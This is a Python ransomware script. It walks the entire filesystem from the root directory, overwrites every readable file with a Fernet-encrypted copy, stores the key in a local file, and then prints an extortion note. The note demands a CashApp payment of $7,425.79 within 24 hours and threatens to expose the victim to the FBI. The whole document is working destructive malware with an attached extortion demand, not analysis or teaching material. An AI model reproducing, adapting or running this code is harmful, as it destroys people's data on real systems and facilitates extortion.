#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Function to find all files
def find_files(directory):
    files = []
    for root, dirs, file_list in os.walk(directory):
        for file_name in file_list:
            if file_name in ["main.py", "thekey.key", "decrypt.py"]:
                continue
            files.append(os.path.join(root, file_name))
    return files

# Finding all files starting from root directory
files = find_files("/")

print("Files to be encrypted:", files)

# Generating a key
key = Fernet.generate_key()

# Saving the key to a file
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# Encrypting all the files
for file in files:
    try:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
        print(f"Encrypted {file}")
    except (PermissionError, IsADirectoryError, FileNotFoundError, OSError) as e:
        print(f"Skipping file {file} due to {e}")

print("Encryption process completed.")



print("All of your files have been encrypted. You will cashapp me ($SBussisoDube) the ammount you have written on the fraudulent check you sent me via email ($7,425.79 USD)")
print("if you fail to do so I will hand everything over to the FBI including your real identity and location.")
print("you have 24 hours to respond")
print("you will respond via the same email thread you sent the counterfit check")